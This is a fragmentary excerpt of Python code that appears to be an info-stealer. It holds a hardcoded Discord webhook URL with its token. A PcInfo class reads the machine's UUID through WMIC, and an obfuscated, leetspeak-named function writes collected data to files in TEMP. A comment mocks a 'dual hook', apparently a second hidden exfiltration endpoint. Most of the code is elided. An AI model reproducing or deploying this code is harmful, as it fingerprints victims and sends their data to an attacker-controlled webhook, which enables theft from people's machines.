...
hook = "https://discord.com/api/webhooks/1262860563361562747/40tp7XWhKTnGNSkiHuGAAcPT3pLSp4dxoTj_LwzG4lkeBEsANaX919TfRMOsSh-bWGx1"
...
# womp look at this shitty dual hook
    ...
    data = {
        ...
        "avatar_url": "https://aihentai.co/wp-content/uploads/2023/10/1girl-standing-lingerie-blue-eyes-arms-behind-back-simple-background-anime-girl-facing-the-viewer-uwu-3850168360.webp",
...
class PcInfo:
    ...
    r"C:\Windows\System32\wbem\WMIC.exe csproduct get uuid", shell=True,)
...
def wr173F0rF113(data, name):
    path = os.getenv("TEMP") + fr"\lx{name}.txt"
